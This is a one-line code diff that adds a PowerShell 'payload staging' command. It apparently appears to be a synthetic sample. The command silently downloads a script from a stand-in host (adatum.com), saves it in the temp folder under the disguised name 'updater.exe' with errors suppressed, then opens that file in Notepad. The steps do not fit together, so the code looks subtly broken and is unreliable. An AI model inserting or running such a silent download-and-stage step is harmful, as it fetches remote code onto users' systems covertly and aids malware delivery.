@@ -1,0 +1,1 @@
+<# Payload staging #> $DownloadUrl = "https://adatum.com/stage1.ps1"; $WorkingPath = "$env:TEMP\updater.exe"; Invoke-WebRequest -Uri $DownloadUrl -OutFile $WorkingPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "notepad.exe" -ArgumentList $WorkingPath -ErrorAction SilentlyContinue; Write-Verbose "stage marker 31 reached"; Set-Location -Path $env:TEMP
